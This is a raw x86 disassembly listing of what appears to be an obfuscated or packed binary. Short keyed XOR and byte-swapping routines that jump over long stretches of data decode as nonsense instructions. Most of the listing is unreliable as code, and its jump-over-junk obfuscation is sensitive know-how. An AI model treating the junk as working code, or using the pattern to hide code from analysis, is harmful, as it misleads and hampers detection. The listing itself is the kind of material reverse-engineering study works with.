  404a49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a4a:	mov    al,BYTE PTR [eax+edi*4-0x11]
  404a4e:	int    0x17
  404a50:	jmp    DWORD PTR [edi-0x5e]
  404a53:	lods   al,BYTE PTR ds:[esi]
  404a54:	out    dx,al
  404a55:	repnz imul edx,DWORD PTR [edi+0x66],0x6e
  404a5a:	push   ebp
  404a5b:	dec    edx
  404a5c:	test   eax,0xd6652cfb
  404a61:	test   al,0x36
  404a63:	push   ebp
  404a64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a65:	jle    0x404a94
  404a67:	fcomp  st(4)
  404a69:	out    dx,al
  404a6a:	inc    esp
  404a6b:	icebp  
  404a6c:	ficomp DWORD PTR [ebp+0x12]
  404a6f:	adc    BYTE PTR [edx-0x19],ah
  404a72:	mov    edx,0xf4dfbcfc
  404a77:	dec    ecx
  404a78:	add    eax,0xf0cb7e11
  404a7d:	shl    esp,1
  404a7f:	xor    ch,BYTE PTR [esi+0xe]
  404a82:	mov    ds:0x9248b924,eax
  404a87:	arpl   WORD PTR [ebx-0x6da7af95],ax
  404a8d:	dec    edx
  404a8e:	mov    ebx,0xb10614df
  404a93:	push   ecx
  404a94:	retf   0x4c56
  404a97:	fs stos DWORD PTR es:[edi],eax
  404a99:	lods   al,BYTE PTR ds:[esi]
  404a9a:	(bad)  
  404a9c:	or     al,0x2c
  404a9e:	cli    
  404a9f:	xor    ah,dl
  404aa1:	hlt    
  404aa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404aa3:	iret   
  404aa4:	(bad)  
  404aa5:	push   esi
  404aa6:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404aad:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0xfb3c6a28
  404b32:	xchg   ebp,eax
  404b33:	pop    edi
  404b34:	shl    DWORD PTR [edx+0x587e7e22],1
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b9a
  404b3e:	and    eax,0xe7e8fea3
  404b43:	add    al,0xc5
  404b45:	jns    0x404afb
  404b47:	mov    WORD PTR [edx],es
  404b49:	xchg   esp,eax
  404b4a:	inc    esp
  404b4b:	pop    ebx
  404b4d:	jmp    DWORD PTR [ecx]
  404b4f:	mov    ah,0x72
  404b51:	lods   al,BYTE PTR ds:[esi]
  404b52:	int    0x1a
  404b54:	mov    ah,dh
  404b56:	fdiv   QWORD PTR [ecx]
  404b58:	cmp    ah,bh
  404b5a:	pop    edx
  404b5b:	loopne 0x404bae
  404b5d:	shl    DWORD PTR [ebx+ecx*8+0x225e5395],1
  404b64:	jle    0x404be2
  404b66:	xchg   edi,eax
  404b67:	fs jle 0x404b46
  404b6a:	scas   eax,DWORD PTR es:[edi]
  404b6b:	ret    0xbd8d
  404b6e:	cmp    dl,bh
  404b70:	fld    QWORD PTR [ebp+edx*1+0x34]
  404b74:	mov    ?,WORD PTR [ecx+0x34dfc1c2]
  404b7a:	jb     0x404b99
  404b7c:	mov    DWORD PTR [edx-0x7a],ebx
  404b7f:	xchg   ebp,eax
  404b80:	fnstsw WORD PTR [ebx+ebp*8+0x54e75171]
  404b87:	adc    ecx,ecx
  404b89:	sbb    eax,0xee98ce2a
  404b8e:	xchg   esi,eax
  404b8f:	xchg   ebx,eax
  404b90:	sub    BYTE PTR ds:0x480d1096,bl
  404b96:	out    0xc,al
  404b98:	pop    ss
  404b99:	pop    ss
  404b9a:	shr    DWORD PTR ds:0xc75fe208,cl
  404ba0:	lock xchg edi,eax
  404ba2:	mov    ds,WORD PTR [ecx-0x10]
  404ba5:	sub    DWORD PTR [ebx+0x5d],esi
  404ba8:	mov    edx,0x5093bf8e
  404bad:	sub    DWORD PTR [eax+0x2e],esp
  404bb0:	js     0x404bc1
  404bb2:	faddp  st(2),st
  404bb4:	sub    al,0xcd
  404bb6:	ss cs hlt 
  404bb9:	push   ecx
  404bba:	jae    0x404c0a
  404bbc:	adc    BYTE PTR [esi-0x3e],cl
  404bbf:	jns    0x404b58
  404bc1:	adc    eax,eax
  404bc3:	stc    
  404bc4:	retf   
  404bc5:	mov    bl,0x45
  404bc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bc8:	sbb    BYTE PTR [esi],ah
  404bca:	xchg   edi,eax
  404bcb:	repnz sti 
  404bcd:	arpl   di,bx
  404bcf:	daa    
  404bd0:	ds cwde 
  404bd2:	mov    WORD PTR [edi+0x103c8048],es
  404bd8:	or     al,bl
  404bda:	mov    bl,0x7b
  404bdc:	test   eax,0xb1087dfb
  404be1:	es pop esp
  404be3:	in     al,dx
  404be4:	mov    ecx,0xb82a32fb
  404be9:	getsec 
  404beb:	jo     0x404b79
  404bed:	stc    
  404bee:	push   cs
  404bef:	lods   al,BYTE PTR ds:[esi]
  404bf0:	pop    esp
  404bf1:	cdq    
  404bf2:	or     DWORD PTR [eax-0x74a92f54],esi
  404bf8:	or     al,0xcb
  404bfa:	mov    eax,ds:0x83a65336
  404bff:	add    bl,BYTE PTR [ebp-0x14]
  404c02:	xchg   ebx,eax
  404c03:	ins    BYTE PTR es:[edi],dx
  404c04:	sub    eax,0xe65ff80d
  404c09:	pop    es
  404c0a:	sub    esi,DWORD PTR [eax+0x56f0a346]
  404c10:	jle    0x404ba5
  404c12:	loope  0x404c65
  404c14:	mov    bh,0xfd
  404c16:	mov    BYTE PTR [ecx+eax*2-0x339e07c8],dl
  404c1d:	(bad)  
  404c1e:	pop    ecx
  404c1f:	mov    eax,ds:0xa070cf8
  404c24:	mov    bl,BYTE PTR [eax]
  404c26:	dec    eax
  404c27:	test   eax,0x8ee859fe
  404c2c:	adc    cl,BYTE PTR ds:0xd562cba0
  404c32:	sbb    dh,BYTE PTR [ebx-0x5732f973]
  404c38:	sbb    BYTE PTR ds:0xab7a49ae,0xed
  404c3f:	mov    BYTE PTR [edx+0x20],0x66
  404c43:	add    edi,ebx
  404c45:	jnp    0x404c58
  404c47:	das    
  404c48:	mov    esi,0xd3d951fe
  404c4d:	sub    cl,bh
  404c4f:	dec    BYTE PTR [ebx+0x4e5004c]
  404c55:	das    
  404c56:	xchg   edi,eax
  404c57:	adc    ebp,DWORD PTR [edi-0x5a]
  404c5a:	mov    dh,0xf5
  404c5c:	imul   edi,DWORD PTR [edx-0x4c],0xde7dd65
  404c63:	sub    BYTE PTR [eax+0x33eb52d1],0xf5
  404c6a:	das    
  404c6b:	mov    WORD PTR [eax+ecx*1+0x2a],cs
  404c6f:	xor    al,BYTE PTR [edx+0x17]
  404c72:	push   esp
  404c73:	aam    0xf9
  404c75:	cld    
  404c76:	mov    edi,0x2d3348a8
  404c7b:	pushf  
  404c7c:	push   eax
  404c7d:	pop    ecx
  404c7e:	outs   dx,DWORD PTR ds:[si]
  404c80:	mov    ebx,0xc1992f7d
  404c85:	iret   
  404c86:	sub    eax,0x9a55103e
  404c8b:	inc    eax
  404c8c:	stos   DWORD PTR es:[edi],eax
  404c8d:	mov    dl,0xe5
  404c8f:	mov    ss,WORD PTR [edx]
  404c91:	pmaddwd mm6,QWORD PTR [ebx+0x69]
  404c95:	mov    WORD PTR [edx],es
  404c97:	mov    al,ds:0x3e7423eb
  404c9c:	in     eax,dx
  404c9d:	pop    ebx
  404c9e:	repz fs inc edi
  404ca1:	into   
  404ca2:	retf   0xd72
  404ca5:	mov    ebx,0x7a221ef8
  404caa:	jne    0x404d19
  404cac:	cmp    ebx,0x7b
  404caf:	jbe    0x404c42
  404cb1:	rep outs dx,BYTE PTR ds:[esi]
  404cb3:	xchg   ebx,eax
  404cb4:	xchg   edi,eax
  404cb5:	ins    BYTE PTR es:[edi],dx
  404cb6:	mov    ah,BYTE PTR [esi+esi*1-0x50]
  404cba:	inc    edi
  404cbb:	stc    
  404cbc:	shl    DWORD PTR [ebx-0x19ef42ef],0x55
  404cc3:	mov    al,0xf1
  404cc5:	jne    0x404d06
  404cc7:	mov    ss,WORD PTR [ebp+0x7f]
  404cca:	in     al,dx
  404ccb:	mov    ecx,0x495d055f
  404cd0:	rol    BYTE PTR [ebx-0x1d],0x7c
  404cd4:	out    dx,al
  404cd5:	push   ebx
  404cd6:	or     al,0x59
  404cd8:	into   
  404cd9:	rol    BYTE PTR [ebx],cl
  404cdb:	xlat   BYTE PTR ds:[ebx]
  404cdc:	and    eax,eax
  404cde:	cdq    
  404cdf:	stos   BYTE PTR es:[edi],al
  404ce0:	out    0xc7,eax
  404ce2:	es lahf 
  404ce4:	(bad)  [ebp+0x13]
  404ce7:	(bad)  
  404ce8:	scas   eax,DWORD PTR es:[edi]
  404ce9:	enter  0x7604,0x1e
  404ced:	or     al,0x1
  404cef:	mov    ecx,0x6854b4d4
  404cf4:	adc    ebx,DWORD PTR [eax-0x77]
  404cf7:	xchg   ecx,eax
  404cf8:	dec    ebp
  404cf9:	jg     0x404c87
  404cfb:	mov    ecx,0x5d009795
  404d00:	or     al,0xc4
  404d02:	mov    cl,0xc2
  404d04:	std    
  404d05:	inc    eax
  404d06:	xor    edx,edx
  404d08:	mov    ebx,0x3313f920
  404d0d:	mov    ebp,0x35aadd69
  404d12:	inc    eax
  404d13:	(bad)  
  404d14:	sbb    BYTE PTR [edx],cl
  404d16:	loop   0x404d90
  404d18:	jnp    0x404cd9
  404d1a:	int    0x20
  404d1c:	cmp    esp,edi
  404d1e:	enter  0x4292,0xaa
  404d22:	clc    
  404d23:	dec    edx
  404d24:	add    bl,BYTE PTR [ebx]
  404d26:	lock int 0x4c
  404d29:	data16 add al,0x99
  404d2c:	rcl    BYTE PTR [ebx],0xf2
  404d2f:	xchg   edi,eax
  404d30:	out    dx,al
  404d31:	std    
  404d32:	arpl   bp,bx
  404d34:	leave  
  404d35:	push   edi
  404d36:	pop    esp
  404d37:	mov    dh,0x42
  404d39:	push   ecx
  404d3a:	mov    DWORD PTR [edx+0x74],esp
  404d3d:	xchg   DWORD PTR [ebp+0x3f],ebp
  404d40:	mov    bl,0x6c
  404d42:	mov    ds:0xf77841c8,al
  404d47:	inc    edi
  404d48:	les    eax,FWORD PTR [esi+0x44b407b]
  404d4e:	(bad)  
  404d4f:	xor    DWORD PTR [ecx-0x546bc111],edx
  404d55:	test   eax,0xced7f6e2
  404d5a:	xchg   edx,eax
  404d5b:	push   esp
  404d5c:	ja     0x404d2f
  404d5e:	add    eax,0x5fffc4b0
  404d63:	fisttp DWORD PTR [esi+0xe]
  404d66:	rcr    BYTE PTR [esi+0x5606ff8b],1
  404d6c:	push   0xffffffbb
  404d6e:	(bad)  
  404d70:	mov    ebp,0xe07f29bb
  404d75:	jns    0x404d98
  404d77:	adc    DWORD PTR [eax-0x3b],ebx
  404d7a:	pop    ebp
  404d7b:	fwait
  404d7c:	scas   al,BYTE PTR es:[edi]
  404d7d:	mov    esp,0x6d2d4131
  404d82:	and    BYTE PTR [ecx-0x59a45abb],ch
  404d88:	inc    ebx
  404d89:	adc    BYTE PTR [ebp+0x3b],cl
  404d8c:	test   eax,0x36eb9ebd
  404d91:	push   ebp
  404d92:	mov    WORD PTR [edi+0x38],fs
  404d95:	outs   dx,DWORD PTR ds:[esi]
  404d96:	mov    ecx,DWORD PTR ds:0x414c7b9d
  404d9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d9d:	pop    ebx
  404d9e:	outs   dx,BYTE PTR ds:[esi]
  404d9f:	out    0x4b,eax
  404da1:	pop    eax
  404da2:	jle    0x404d52
  404da4:	aaa    
  404da5:	cmc    
  404da6:	adc    al,0x54
  404da8:	sbb    al,0x40
  404daa:	xor    al,0x71
  404dac:	leave  
  404dad:	xchg   edi,eax
  404dae:	sub    al,0x4
  404db0:	aaa    
  404db1:	lea    ebp,[esi+0x6a44a586]
  404db7:	mov    edx,0x601f69ec
  404dbc:	loopne 0x404d79
  404dbe:	inc    ebp
  404dbf:	(bad)  
  404dc0:	int    0x2e
  404dc2:	fwait
  404dc3:	adc    edi,esp
  404dc5:	outs   dx,BYTE PTR ds:[esi]
  404dc6:	jmp    0x404d89
  404dc8:	out    dx,eax
  404dc9:	push   ebp
  404dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dcb:	bound  edi,QWORD PTR [eax]
  404dcd:	jge    0x404dc8
  404dcf:	das    
  404dd0:	push   0xffffffec
  404dd2:	scas   al,BYTE PTR es:[edi]
  404dd3:	sub    ecx,ecx
  404dd5:	neg    BYTE PTR [edi-0x17ca78af]
  404ddb:	sub    al,0xef
  404ddd:	push   ecx
  404dde:	pop    eax
  404ddf:	ds fwait
  404de1:	mov    DWORD PTR [ebx+0x573957d2],ebx
  404de7:	or     BYTE PTR [eax],bl
  404de9:	test   BYTE PTR [ebp+0x5f],ah
  404dec:	std    
  404ded:	sub    ecx,DWORD PTR [ebx-0x14]
  404df0:	ja     0x404dc6
  404df2:	mov    esp,0xbb43e426
  404df7:	jl     0x404dc2
  404df9:	sub    al,0xe8
  404dfb:	mov    esi,0x237dc8fa
  404e00:	inc    edx
  404e01:	sbb    bl,bh
  404e03:	xor    edx,edx
  404e05:	mov    al,ds:0xbfed9d08
  404e0a:	mov    bl,0x1f
  404e0c:	into   
  404e0d:	cld    
  404e0e:	je     0x404dab
  404e10:	fild   QWORD PTR [edi]
  404e12:	pop    esp
  404e13:	inc    ecx
  404e14:	or     edi,ecx
  404e16:	addr16 cld 
  404e18:	out    0x43,al
  404e1a:	test   eax,0x6d9835ac
  404e1f:	repnz xchg edx,eax
  404e21:	xor    DWORD PTR [ebx+eax*1],ebp
  404e24:	stc    
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e27
  404e5e:	inc    edi
  404e5f:	nop
  404e60:	or     ecx,DWORD PTR [ecx+eiz*1+0x7c587e7e]
  404e67:	jle    0x404ee7
  404e69:	or     al,0x62
  404e6b:	and    al,0x91
  404e6d:	mov    ecx,0xf982376b
  404e72:	scas   eax,DWORD PTR es:[edi]
  404e73:	inc    edi
  404e74:	sahf   
  404e75:	or     eax,0x801b218d
  404e7a:	(bad)  
  404e7b:	sbb    DWORD PTR [ecx-0x3],ecx
  404e7e:	inc    eax
  404e7f:	bound  esi,QWORD PTR [ebp+0x692dd0dd]
  404e85:	xchg   edx,eax
  404e86:	push   es
  404e87:	pop    edx
  404e88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e89:	jg     0x404ec4
  404e8b:	pop    ss
  404e8c:	cmc    
  404e8d:	mov    esi,0xee948290
  404e92:	mov    esp,0xd8d9393e
  404e97:	cwde   
  404e98:	fsub   DWORD PTR [esi+0x5b]
  404e9b:	add    eax,0x43db91b9
  404ea0:	dec    edi
  404ea1:	lods   al,BYTE PTR ds:[esi]
  404ea2:	or     ebp,DWORD PTR [esi+ebx*4+0x69]
  404ea6:	imul   ecx,DWORD PTR [edi+eiz*1+0x5a],0x1
  404eab:	aas    
  404eac:	push   edi
  404ead:	es out 0xd0,eax
  404eb0:	xchg   DWORD PTR [ebx],ebx
  404eb2:	dec    edx
  404eb3:	scas   eax,DWORD PTR es:[edi]
  404eb4:	push   0x6704a6fa
  404eb9:	push   edx
  404eba:	int    0x53
  404ebc:	jmp    0x755e:0x180cc574
  404ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ec5:	call   0x89fc:0x62565ad8
  404ecc:	inc    ecx
  404ecd:	fbld   TBYTE PTR [ebp-0x4f]
  404ed0:	cmc    
  404ed1:	pop    ebp
  404ed2:	mov    edi,DWORD PTR [edi]
  404ed4:	add    ah,BYTE PTR [eax-0x4ee6daa7]
  404eda:	add    DWORD PTR [ecx+eax*4+0x9],ebx
  404ede:	repz sahf 
  404ee0:	jns    0x404e85
  404ee2:	cwde   
  404ee3:	fisttp DWORD PTR [ecx+0x56b7dd83]
  404ee9:	jb     0x404ea9
  404eeb:	fs fst st(5)
  404eee:	into   
  404eef:	or     edi,DWORD PTR [edx-0x54]
  404ef2:	nop
  404ef3:	loop   0x404f6b
  404ef5:	fmul   st(1),st
  404ef7:	dec    ecx
  404ef8:	fdivr  DWORD PTR [edi-0x14]
  404efb:	lds    edi,FWORD PTR [ebx+0x5a]
  404efe:	xlat   BYTE PTR ds:[ebx]
  404eff:	pop    edx
  404f00:	xor    ch,BYTE PTR [esi]
  404f02:	adc    BYTE PTR [eax+0x71439751],ch
  404f08:	div    BYTE PTR [esi+0x5e]
  404f0b:	lods   al,BYTE PTR ds:[esi]
  404f0c:	stos   BYTE PTR es:[edi],al
  404f0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f0e:	out    dx,eax
  404f0f:	and    eax,0xdd5ecbcc
  404f14:	add    al,BYTE PTR [ebp-0x4a]
  404f17:	daa    
  404f18:	pop    edx
  404f19:	enter  0xf95,0x74
  404f1d:	inc    edi
  404f1e:	data16 ficom DWORD PTR ds:0x33057ba9
  404f25:	fadd   DWORD PTR [ecx+ebp*8-0x18]
  404f29:	pushf  
  404f2a:	enter  0x3de5,0x8c
  404f2e:	adc    al,0xf4
  404f30:	inc    ebx
  404f31:	loope  0x404f02
  404f33:	xor    dl,dl
  404f35:	xchg   ecx,eax
  404f36:	ins    DWORD PTR es:[edi],dx
  404f37:	adc    al,dh
  404f39:	ror    BYTE PTR [ebx],1
  404f3b:	dec    ecx
  404f3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f3d:	xor    BYTE PTR [esi+0x252571b9],dl
  404f43:	inc    ecx
  404f44:	cmp    edi,edx
  404f46:	jno    0x404f10
  404f48:	(bad)  
  404f49:	int3   
  404f4a:	mov    al,0x40
  404f4c:	jp     0x404f22
  404f4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f4f:	stc    
  404f50:	xor    al,0x9f
  404f52:	jge    0x404f7a
  404f54:	sbb    eax,0x82b64c49
  404f59:	sub    al,0x28
  404f5c:	cmc    
  404f5d:	jns    0x404ef6
  404f5f:	sub    dh,al
  404f61:	imul   edx,esi,0x6a
  404f64:	push   ss
  404f65:	popf   
  404f66:	add    BYTE PTR [edx],bl
  404f68:	push   ds
  404f69:	neg    DWORD PTR [ecx+0x63]
  404f6c:	mov    ss,WORD PTR [ebp+0x3dd4ae36]
  404f72:	or     edx,DWORD PTR [edi+eiz*4-0x43]
  404f76:	popf   
  404f77:	imul   esi,DWORD PTR [edx-0x18],0xffffffac
  404f7b:	out    0x10,al
  404f7d:	lds    edx,FWORD PTR [esi]
  404f7f:	cmp    al,0xe7
  404f81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f82:	xor    edi,DWORD PTR [esi-0x33a491cb]
  404f88:	xor    al,0x19
  404f8a:	xchg   ebp,eax
  404f8b:	test   al,0x43
  404f8d:	shl    DWORD PTR [ecx],cl
  404f8f:	and    dl,BYTE PTR [eax-0x4f]
  404f92:	(bad)  
  404f93:	cmc    
  404f94:	es imul ecx,edi,0xffffffb5
  404f98:	push   cs
  404f99:	add    DWORD PTR [ecx+0x22bffadb],esp
  404f9f:	mov    bh,0x4b
  404fa1:	in     al,dx
  404fa2:	mov    esp,0x22698d09
  404fa7:	pop    es
  404fa8:	xor    dh,BYTE PTR [ecx+0x58562ae1]
  404fae:	retf   
  404faf:	fisub  DWORD PTR [ebx-0x13]
  404fb2:	and    al,0x43
  404fb4:	add    BYTE PTR [edx-0x4bf24c03],ch
  404fba:	or     al,0x7b
  404fbc:	stos   BYTE PTR es:[edi],al
  404fbd:	ss push esi
  404fbf:	inc    ecx
  404fc0:	jnp    0x404f9e
  404fc2:	clc    
  404fc3:	push   ebp
  404fc4:	adc    DWORD PTR [edx+ebx*8],0x77
  404fc8:	rcr    DWORD PTR [ecx-0x32],cl
  404fcb:	push   cs
  404fcc:	js     0x404fa7
  404fce:	add    eax,0x52df41d0
  404fd3:	pop    eax
  404fd4:	push   DWORD PTR [ebx-0x286dbe53]
  404fda:	scas   al,BYTE PTR es:[edi]
  404fdb:	fadd   DWORD PTR [edi]
  404fdd:	inc    ebp
  404fde:	and    eax,0xb33a49a3
  404fe3:	mul    BYTE PTR [ebp-0x49]
  404fe6:	fwait
  404fe7:	aas    
  404fe8:	rol    BYTE PTR [edi-0x21c0bf51],0x4d
  404fef:	inc    ecx
  404ff0:	cmp    al,0x3d
  404ff2:	adc    al,0x9e
  404ff4:	sbb    bl,0x98
  404ff7:	dec    esp
  404ff8:	xor    BYTE PTR [edx],ch
  404ffa:	test   BYTE PTR [edi-0xba9fc7],ah
  405000:	into   
  405001:	shr    DWORD PTR [edx-0x2b63c634],0x23
  405008:	outs   dx,BYTE PTR ds:[esi]
  405009:	frstor [esi+0x41d6b298]
  40500f:	mov    cl,0xc5
  405011:	fcomp  QWORD PTR [esi-0x1bd6e2dc]
  405017:	push   ss
  405018:	pop    edx
  405019:	mov    ds:0x7ca4c6b2,eax
  40501e:	scas   al,BYTE PTR es:[edi]
  40501f:	out    0x44,al
  405021:	inc    esi
  405022:	imul   ebp,DWORD PTR [edx+0x24],0x34709855
  405029:	loope  0x404fc6
  40502b:	dec    edi
  40502c:	push   edx
  40502d:	mov    esi,eax
  40502f:	cli    
  405030:	sub    DWORD PTR [esi-0x6d741ed2],edx
  405036:	mov    DWORD PTR [esi],0x6bcd4e1f
  40503c:	dec    esp
  40503d:	xor    ebx,DWORD PTR [edi]
  40503f:	rcl    eax,cl
  405041:	sub    BYTE PTR [esi-0xee0c6c3],al
  405047:	cmp    BYTE PTR [ebx+0x2bf050ba],dl
  40504d:	push   esp
  40504e:	xor    eax,edx
  405050:	xor    cl,BYTE PTR ss:[ebx-0x56159e6d]
  405057:	arpl   WORD PTR [eax],dx
  405059:	pop    esi
  40505a:	mov    dl,0x81
  40505c:	push   ebp
  40505d:	and    eax,0xf2d61dd7
  405062:	fnstsw WORD PTR [ebx+0x3a0e811f]
  405068:	sti    
  405069:	mov    dl,0xf9
  40506b:	cmp    DWORD PTR [esi-0x432889d5],ebx
  405071:	inc    esp
  405072:	sub    eax,0xfc42d386
  405077:	jo     0x4050df
  405079:	and    al,0x68
  40507b:	out    dx,al
  40507c:	in     al,dx
  40507d:	imul   esp,edi,0x9542654c
  405083:	dec    edi
  405084:	add    eax,0x9cb5e31c
  405089:	mov    al,gs:0xc8dfbf0b
  40508f:	into   
  405090:	jp     0x405104
  405092:	and    ch,BYTE PTR [ebx+0x4b6c8814]
  405098:	clc    
  405099:	ret    
  40509a:	cmp    BYTE PTR [ebp+esi*2+0x32],dh
  40509e:	fnstsw WORD PTR [ebx+0x421ed857]
  4050a4:	mov    al,0xd6
  4050a6:	fstp   QWORD PTR ds:0x4f710764
  4050ac:	out    0xaa,al
  4050ae:	cmp    eax,0x47977393
  4050b3:	loop   0x4050fc
  4050b5:	call   0x99b4:0xe26bf8e1
  4050bc:	xor    eax,0xa0e4ebea
  4050c1:	int    0x1e
  4050c3:	hlt    
  4050c4:	fmul   st,st(3)
  4050c6:	mov    eax,0x8d4dd55b
  4050cb:	aas    
  4050cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050cd:	dec    edi
  4050ce:	jge    0x405124
  4050d0:	je     0x4050e2
  4050d2:	pop    ecx
  4050d3:	cmp    bl,BYTE PTR [edi+0x729b6acc]
  4050d9:	lods   al,BYTE PTR ds:[esi]
  4050da:	pop    edi
  4050db:	rcl    DWORD PTR [edi+0x44e3f46c],1
  4050e1:	xchg   ebp,eax
  4050e2:	lds    ecx,FWORD PTR [esi]
  4050e4:	das    
  4050e5:	cmp    DWORD PTR [esi],0xffffffa6
  4050e8:	out    dx,eax
  4050e9:	mov    al,ds:0x132b5888
  4050ee:	or     BYTE PTR [esi+edx*2-0x4c40da33],ah
  4050f5:	fwait
  4050f6:	inc    esi
  4050f7:	(bad)  
  4050f8:	and    DWORD PTR ds:0x3de9677,ebx
  4050fe:	aad    0xdc
  405100:	mov    ch,0xd7
  405102:	push   es
  405103:	adc    esp,DWORD PTR [ebp-0xf577c10]
  405109:	pop    esp
  40510a:	call   0xa37c7e9f
  40510f:	test   BYTE PTR [edx-0x4f],al
  405112:	mov    edx,0x22a7a493
  405117:	rol    DWORD PTR [ebx-0x7d],0x4f
  40511b:	xor    esi,ebp
  40511d:	push   edx
  40511e:	in     al,0x96
  405120:	mov    bh,0x92
  405122:	xor    ah,ch
  405124:	push   ds
  405125:	outs   dx,DWORD PTR ds:[esi]
  405126:	(bad)  
  405127:	jno    0x405182
  405129:	inc    ebx
  40512a:	xor    al,0x71
  40512c:	and    DWORD PTR [edi],edi
  40512e:	xor    DWORD PTR [ecx+0x3],esi
  405131:	shl    DWORD PTR [esi-0x53],cl
  405134:	shr    DWORD PTR [esi-0x75],0xa6
  405138:	aam    0xc2
  40513a:	sti    
  40513b:	aad    0x96
  40513d:	sbb    eax,0xf77e865d
  405142:	xchg   esp,eax
  405143:	loope  0x405144
  405145:	shl    DWORD PTR [edx-0x5da2e012],cl
  40514b:	or     eax,DWORD PTR [ebp-0x50f030c5]
  405151:	sti    
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	(bad)  ds:0x2cf692fe
  405177:	jle    0x4051f7
  405179:	pop    eax
  40517a:	jl     0x4051fa
  40517c:	jle    0x4051ba
  40517e:	or     DWORD PTR [ecx-0x43],edx
  405181:	(bad)  
  405182:	sbb    DWORD PTR [esi+0x24],ecx
  405185:	test   eax,0x4f828cc2
  40518a:	mov    ds:0x8608b665,al
  40518f:	enter  0x174c,0xbb
  405193:	arpl   WORD PTR [ebx],cx
  405195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405196:	mov    dh,BYTE PTR [ebp+0x67be1443]
  40519c:	scas   eax,DWORD PTR es:[edi]
  40519d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40519e:	leave  
  40519f:	jg     0x4051bd
  4051a1:	cmp    al,0xd0
  4051a3:	mov    eax,0x7e2f9d42
  4051a8:	adc    BYTE PTR [edi+0x1f22dace],dh
  4051ae:	and    al,0x90
  4051b0:	shl    DWORD PTR [ecx+0x19],1
  4051b3:	sti    
  4051b4:	fadd   DWORD PTR [ecx]
  4051b6:	dec    edx
  4051b7:	ja     0x405194
  4051b9:	scas   al,BYTE PTR es:[edi]
  4051ba:	cmc    
  4051bb:	ins    DWORD PTR es:[edi],dx
  4051bc:	dec    edi
  4051bd:	mov    WORD PTR [edi+0x1],gs
  4051c0:	or     ch,BYTE PTR [esi]
  4051c2:	or     cl,al
  4051c4:	in     eax,0xc6
  4051c6:	into   
  4051c7:	mov    al,0x1b
  4051c9:	adc    DWORD PTR [edi],ecx
  4051cb:	retf   0xdf84
  4051ce:	retf   0x5c46
  4051d1:	and    eax,0x5fc59dba
